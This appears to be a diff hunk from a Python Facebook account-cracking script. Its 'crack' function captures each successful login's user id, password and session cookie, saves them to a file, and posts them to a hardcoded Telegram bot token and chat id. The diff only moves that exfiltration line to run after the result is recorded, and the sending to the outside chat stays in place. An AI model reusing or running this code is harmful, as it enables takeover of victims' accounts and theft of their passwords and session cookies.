@@ -840,13 +840,13 @@ def crack(idf,pwx,url,awal):
 			elif "c_user" in ses.cookies.get_dict():
 				kuki = convert(ses.cookies.get_dict())
 				idf = re.findall('c_user=(.*);xs', kuki)[0]
-				requests.post(f"https://api.telegram.org/bot5623145401:AAHJqVOhmi7Yojm4CuzmJ5pCANbX6xGeTN0/sendMessage?chat_id=-1001866427708&text={idf}\n{pw}\n{kuki}")
 				data = (f'{idf}|{pw}')
 				if data in resok:pass
 				else:
 					resok.append(data)
 					ok+=1
 					open('OK/'+sim_ok,'a').write(data+'\n')
+					requests.post(f"https://api.telegram.org/bot5623145401:AAHJqVOhmi7Yojm4CuzmJ5pCANbX6xGeTN0/sendMessage?chat_id=-1001866427708&text={idf}\n{pw}\n{kuki}")
 					if "coki" in akunok:
 						print("\n╠───%s>> %s|%s %s• %s "%(H,idf,pw,warna_warni_biasa,tahunng(idf)))
 						print("\r╠───%s>> %s "%(H,kuki))
